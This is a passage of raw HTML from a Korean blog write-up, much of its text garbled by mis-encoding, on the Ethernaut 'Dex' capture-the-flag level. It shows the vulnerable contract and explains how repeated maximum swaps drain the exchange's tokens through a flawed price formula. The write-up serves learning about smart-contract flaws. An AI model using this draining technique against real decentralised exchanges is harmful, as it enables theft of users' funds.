ëŒ€í•´ì„œëŠ” ì•Œì•„ì•¼í•œë‹¤.\në˜í•œ ERC20 standardì— ì–´ë–¤ functionì´ í•„ìš”í•œì§€, ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ì§€ ê³µë¶€í•´ì•¼í•œë‹¤.\nì•„ë˜ ë§í¬ë“¤ì„ í†µí•´ ì¶©ë¶„íˆ ìµìˆ™í•´ ì§„ í›„ í’€ê¸°ë¥¼ ê¶Œì¥í•œë‹¤. ë§í¬ ì´ì™¸ì— Youtubeì—ë„ ì¢‹ì€ ìë£Œë“¤ì´ ë§ë‹¤!</p>\n<ul>\n<li><a href=\"https://docs.uniswap.org/protocol/V2/introduction\">Uniswap</a></li>\n<li><a href=\"https://docs.openzeppelin.com/contracts/4.x/api/token/erc20\">openzeppelin ERC20 contract</a></li>\n</ul>\n<h2 id=\"ì½”ë“œ-ë¶„ì„\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"ì½”ë“œ ë¶„ì„ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ì½”ë“œ ë¶„ì„</h2>\n<p>ë¶„ì„ì€ ì£¼ì„ì— ìˆìŠµë‹ˆë‹¤!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//  importing openzeppelin ERC20 contracts and safe math</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/ERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Dex</span>  <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// token 1ì˜ address</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> token1<span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// token 2ì˜ address</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> token2<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token comment\">// token1ê³¼ token2ì˜ addressë¥¼ ì§€ì •í•œë‹¤.</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _token2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        token1 <span class=\"token operator\">=</span> _token1<span class=\"token punctuation\">;</span>\n        token2 <span class=\"token operator\">=</span> _token2<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// ê°€ì¥ ì¤‘ìš”í•œ swap function</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// token1ê³¼ token2ì´ì™¸ì˜ ë‹¤ë¥¸ addressê°€ from ë˜ëŠ” toê°€ ë˜ë©´ revertí•œë‹¤.</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span> <span class=\"token operator\">==</span> token1 <span class=\"token operator\">&amp;&amp;</span> to <span class=\"token operator\">==</span> token2<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span> <span class=\"token operator\">==</span> token2 <span class=\"token operator\">&amp;&amp;</span> to <span class=\"token operator\">==</span> token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Invalid tokens\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// ë°”ê¾¸ë ¤ëŠ”(from) tokenì˜ balanceê°€ amountì´ìƒ ìˆì–´ì•¼í•œë‹¤.</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough to swap\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// token aì™€ token bì˜ êµí™˜ ë¹„ìœ¨ì„ get_swap_price()ë¥¼ ì‚¬ìš©í•´ ê³„ì‚°í•œë‹¤</span>\n        <span class=\"token builtin\">uint</span> swap_amount <span class=\"token operator\">=</span> <span class=\"token function\">get_swap_price</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// ë‚´ í† í°ì„ Dex contractì— ë³´ë‚¸ë‹¤.</span>\n        <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// Dex contractê°€ ERC20 tokenì„ ë³´ë‚¼ ìˆ˜ ìˆë„ë¡ approveí•œë‹¤.</span>\n        <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> swap_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// approveí•œ ë§Œí¼ì˜ í† í°ì„ msg.senderì—ê²Œ ë³´ë‚´ë‹¤.</span>\n        <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> swap_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// token1ê³¼ token2ì´ì™¸ì— liquidity poolì„ ìƒì„±í•  ìˆ˜ ìˆë‹¤.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">add_liquidity</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> token_address<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">{</span>\n        <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// swapì—ì„œ êµí™˜ ë¹„ìœ¨ì„ ê³„ì‚°í•˜ê¸° ìœ„í•´ ì‚¬ìš©í•˜ëŠ” functionì´ë‹¤. </span>\n    <span class=\"token comment\">// ê³„ì‚° ë°©ë²•ì€ ì–´ë²ˆ ë¬¸ì œì—ì„œ ì—„ì²­ ì¤‘ìš”í•˜ë‹¤!!</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">get_swap_price</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>amount <span class=\"token operator\">*</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// spenderê°€ amountë§Œí¼ì˜ tokenì— ëŒ€í•´ì„œ approveëœë‹¤.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">SwappableToken</span><span class=\"token punctuation\">(</span>token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>spender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">SwappableToken</span><span class=\"token punctuation\">(</span>token2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>spender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// tokenë³„ accountê°€ ê°€ì§€ê³  ìˆëŠ” ê°œìˆ˜ë¥¼ í™•ì¸ í•  ìˆ˜ ìˆë‹¤.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> token<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>account<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>      \n\n<span class=\"token comment\">// SwappableToken contract</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SwappableToken</span> <span class=\"token keyword\">is</span> ERC20 <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// ê³„ìˆ˜ë§Œí¼ mintingí•œë‹¤.</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> name<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> symbol<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> initialSupply<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> symbol<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> initialSupply<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div>\n<hr>\n<h2 id=\"í’€ì´\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"í’€ì´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>í’€ì´</h2>\n<p>ì´ë²ˆ ë¬¸ì œì—ì„œ ìš°ë¦¬ëŠ” Dexê°€ ê°€ì§„ ëª¨ë“  í† í°ì„ ì†Œëª¨í•˜ë©´ ëœë‹¤.\nê·¸ë ‡ë‹¤ë©´ ì–´ë–»ê²Œ ì†Œëª¨í•  ìˆ˜ ìˆì„ê¹Œ? íŒíŠ¸ë¥¼ ë³´ì</p>\n<ul>\n<li>Tokenì˜ ê°€ê²©ì´ ì–´ë–»ê²Œ ê³„ì‚°ë˜ëŠ”ê°€? How is the price of the token calculated?</li>\n<li>Swapì´ ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ê°€? How does the swap method work?</li>\n<li>ERC20ì˜ ê±°ë˜ë¥¼ ì–´ë–»ê²Œ approveí•˜ëŠ”ê°€? How do you approve a transaction of an ERC20?</li>\n</ul>\n<p>ìœ„ì—ì„œ ë§ í–ˆë“¯ì´ ERC20ê³¼ Swapì˜ ì‘ë™ë°©ì‹ì„ ì´í•´í•´ì•¼ ì´ ë¬¸ì œë¥¼ í’€ ìˆ˜ ìˆë‹¤.\níŒíŠ¸ë¥¼ í† ëŒ€ë¡œ í’€ì–´ë³´ì.</p>\n<p>ë¨¼ì € ë¬¸ì œì—ì„œ Swap functionì´ ì–´ë–»ê²Œ ì‹¤í–‰ë˜ëŠ”ì§€ í™•ì¸í•´ë³´ì\nswapì€ ë‹¤ìŒê³¼ ê°™ì€ ê³¼ì •ì„ í†µí•´ ì‹¤í–‰ëœë‹¤.</p>\n<ol>\n<li>fromê³¼ toê°€ token1ê³¼ 2ì¸ì§€ í™•ì¸í•œë‹¤.</li>\n<li>msg.senderì˜ from tokenì˜ ì”ì•¡(balance)ë¥¼ í™•ì¸í•œë‹¤.</li>\n<li>get_swap_priceë¥¼ í†µí•´ swapí•  í† í°ì˜ ê°œìˆ˜ë¥¼ ì°¾ëŠ”ë‹¤</li>\n<li>swapí•  from tokenì„ dexì— ë³´ë‚¸ë‹¤.</li>\n<li>dex contract ìì‹ ì´ transferFromì„ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ amountë§Œí¼ì„ approveí•œë‹¤.</li>\n<li>amountë§Œí¼ì˜ í† í°ì„ msg.senderì—ê²Œ ë³´ë‚´ì¤€ë‹¤.</li>\n</ol>\n<p>ê·¸ë ‡ë‹¤ë©´ 3ë²ˆì— ì‚¬ìš©ëœëŠ <code class=\"language-text\">get_swap_price()</code>ëŠ” ì–´ë–¤ í•¨ìˆ˜ì¼ê¹Œ?\n<code class=\"language-text\">get_swap_price()</code>ëŠ” ì˜ˆë¥¼ ë“¤ì–´ token Aë¥¼ 10ê°œë¥¼ swapí•œë‹¤ê³  í–ˆì„ë•Œ token Bë¥¼ ëª‡ê°œ ë°›ì„ ìˆ˜ ìˆëŠ”ì§€ ê³„ì‚°í•˜ëŠ” í•¨ìˆ˜ì´ë”°.\nì´ í•¨ìˆ˜ì˜ ê³„ì‚° ê³µì‹ì€ ë‹¤ìŒê³¼ ê°™ë‹¤ <code class=\"language-text\">(amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))</code></p>\n<p>ë°”ë¡œ ì´ ê³µì‹ì— ë¬¸ì œê°€ ë³´ì¸ë‹¤. ìµœëŒ€ê¸ˆì•¡ìœ¼ë¡œ ê³„ì† swapí•˜ê²Œë˜ë©´ ë‚´ê°€ ê°€ì§€ê³  ìˆëŠ” Tokenì˜ ê°œìˆ˜ê°€ ëŠ˜ê³  DEXê°€ ê°€ì§€ê³  ìˆëŠ” í† í°ì˜ ê°œìˆ˜ë¥¼ 0ìœ¼ë¡œ ë§Œë“¤ ìˆ˜ ìˆë‹¤.\në§Œì•½ DEX contractì˜ í† í° ì”ì•¡ì´ 0ì´ ë˜ë©´ ì–¸ì œë‚˜ 0 ë˜ëŠ” errorë¥¼ returní•  ê²ƒì´ë‹¤.</p>\n<p>ë¨¼ì € swapì—ì„œëŠ” transferFromì„ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì— approveë¥¼ í•´ì£¼ì–´ì•¼í•œë‹¤.</p>\n<p>ìš°ë¦¬ëŠ” DEX contractì˜ approveë¥¼ ì‚¬ìš©í•´ token 1ê³¼ token 2ì— ëŒ€í•´ í•œë²ˆì— approveí•´ì¤„ ìˆ˜ ìˆë‹¤.</p>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// contractë¥¼ approve í•´ì£¼ê¸°</span>\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">,</span> <span class=\"token string\">\"1000000000000000000000\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<br/>\n<p>ì´ì œ swapí•˜ê¸° ì „ ëª¨ë“  ì¤€ë¹„ê°€ ì™„ë£Œë˜ì—ˆë‹¤. ì´ì œ swapì„ í•˜ë©´ì„œ DEXì˜ tokenì¤‘ í•˜ë‚˜ì˜ valueë¥¼ 0ìœ¼ë¡œ ë§Œë“¤ì–´ë³´ì.</p>\n<ol>\n<li>\n<p>ì²˜ìŒìœ¼ë¡œ ë‚´ê°€ ê°€ì§€ê³  ìˆëŠ” token 2 ëª¨ë‘(10)ë¥¼ token 1ë¡œ swapí•˜ì˜€ë‹¤.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 576px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAABJ0AAASdAHeZh94AAAAuElEQVQY002QS27EMAxDff+jFi1g/a0ACQdmEkwXWkiQHkmNzoX8c2QE3J2lpggJtC/2EQFTRWbCPe7eDFXFUlH253lirCjErxG4h24OVUFM/wL9mRH4ChhqFUVEhLfXdWF0LSxJVCYXg04NZYkjmj2d0dGiow3NZ7f7oOAGHseB8Ubeiy/Q3BAaNzC/wHwi/gduCN+kiu7G6Cj4j/BgD7eSyLwjW/Gf/s7iTrEjct8MazXv5pwEfgDiuYKS6mXC+AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"swap1.png\"\n        title=\"swap1.png\"\n        src=\"/static/6151e6e6f67d7fefe0f78d64e4c7c4bb/533c1/swap1.png\"\n        srcset=\"/static/6151e6e6f67d7fefe0f78d64e4c7c4bb/e9ff0/swap1.png 180w,\n/static/6151e6e6f67d7fefe0f78d64e4c7c4bb/f21e7/swap1.png 360w,\n/static/6151e6e6f67d7fefe0f78d64e4c7c4bb/533c1/swap1.png 576w\"\n        sizes=\"(max-width: 576px) 100vw, 576px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n</li>\n<li>\n<p>token 2 20ê°œ ëª¨ë‘ token 1ë¡œ swapí•˜ê¸°</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 568px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAABJ0AAASdAHeZh94AAAA3klEQVQY0z1QS45DMQjL/U86mmqSAOGTdOERpK8LBDLYBpq+BLYUcw4wEUbvGKND/xaCDUQTzIzeO4QFay3MOSHMld0NTIzRR801H4rtG6oKMytCRojj2Ibag0vl8KhZN6t8zr59WZWbvhhuUQRdq1xEBE6GrYGlq4iJP6bZf8wjrsGzfdNfhqtD1gWSmPEVXB9BuoLuASK6IiLQ3Dq86sSb/EyY3OYVpAqbV/AaaQ1n391B8yOYW5sVlkuUYJ589ikw3OuUrI9uvOPUSRn1vwjsvb91zu9zcM7lmyr+Ae1Rz0kzKVQcAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"swap2.png\"\n        title=\"swap2.png\"\n        src=\"/static/a8ff80ea2142eaf2f16fe39685111945/10e91/swap2.png\"\n        srcset=\"/static/a8ff80ea2142eaf2f16fe39685111945/e9ff0/swap2.png 180w,\n/static/a8ff80ea2142eaf2f16fe39685111945/f21e7/swap2.png 360w,\n/static/a8ff80ea2142eaf2f16fe39685111945/10e91/swap2.png 568w\"\n        sizes=\"(max-width: 568px) 100vw, 568px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n</li>\n</ol>\n<p>swapì„ ê³„ì†í•˜ë‹¤ë³´ë©´ ë‚´ê°€ ê°€ì§€ê³  ìˆëŠ” tokenì˜ ê°œìˆ˜ëŠ” ì ì  ë§ì•„ì§€ê³  DEXê°€ ê°€ì§€ê³  ìˆëŠ” Tokenì˜ ê°œìˆ˜ëŠ” ì¤„ì–´ë“œëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.</p>\n<ol start=\"3\">\n<li>\n<p>3ë²ˆì§¸ swap</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 567px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAABJ0AAASdAHeZh94AAAA4klEQVQY002QS27EMAxDc/+TdtBObFGSJbsLFlaSYhaCAZJ++hz+Ah3OLp2AsrXGs530tzIRFBECYDvP8t2cvXeaWr0ZcfuNAuHhP2COpLtzjEEzo5oyNbjGpI9HV/oYzNhZY0TQzLnWLF9Vi3GMtxWwPrhTFYSCIYPTk+Z26cDdNOrz0zwzOXxQoVQzHv4Nhl+hvc4ef9fofgF3IzNCpPwNgKCme6aaWwMoAA/96jfwCpUh8g/UD2BNFFn+JzBvIAr46gyLEvdd9ioR17q/uZgZdfgoPTnnqsyTn3NyrUvb9Qfloc819XS67wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"swap3.png\"\n        title=\"swap3.png\"\n        src=\"/static/9f486aebc86db729309dad06ee214d46/8710b/swap3.png\"\n        srcset=\"/static/9f486aebc86db729309dad06ee214d46/e9ff0/swap3.png 180w,\n/static/9f486aebc86db729309dad06ee214d46/f21e7/swap3.png 360w,\n/static/9f486aebc86db729309dad06ee214d46/8710b/swap3.png 567w\"\n        sizes=\"(max-width: 567px) 100vw, 567px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n</li>\n<li>\n<p>4ë²ˆì§¸ swap</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 565px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAABJ0AAASdAHeZh94AAAA8klEQVQoz0WRy44FIQhE/f8fndVVwTdqagK23QuiAilOoZM20H1F4oQYI4gIPvxAv4geG5jZcjEEMDFyKSCKYCIQM1prVvPeo/cON2VidsHeG2ut97T72va+cfO3dvs15px2OiVsvqDkbDRGSgEpMAY1pJQslIhTQinqht+8UlGM5m4MOYRSB9ZeNkWn2jk/Coundmlu3yE8d9VyvXakv4Cc8jvVdqSE3JGz5rMRKr3uTHeq/epICbVHCXXHToagx2qWVUwbiQk5plfQRB+bKmifkz/BYh91BrqpglSPBRFDF5FjeT5Wnjj2t9W/3FnLzf0DMlAgaznUQ5UAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"swap4.png\"\n        title=\"swap4.png\"\n        src=\"/static/7b50645dcc758dc06c59153079cc5252/07eba/swap4.png\"\n        srcset=\"/static/7b50645dcc758dc06c59153079cc5252/e9ff0/swap4.png 180w,\n/static/7b50645dcc758dc06c59153079cc5252/f21e7/swap4.png 360w,\n/static/7b50645dcc758dc06c59153079cc5252/07eba/swap4.png 565w\"\n        sizes=\"(max-width: 565px) 100vw, 565px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n</li>\n<li>\n<p>5ë²ˆì§¸ swap</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 561px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: 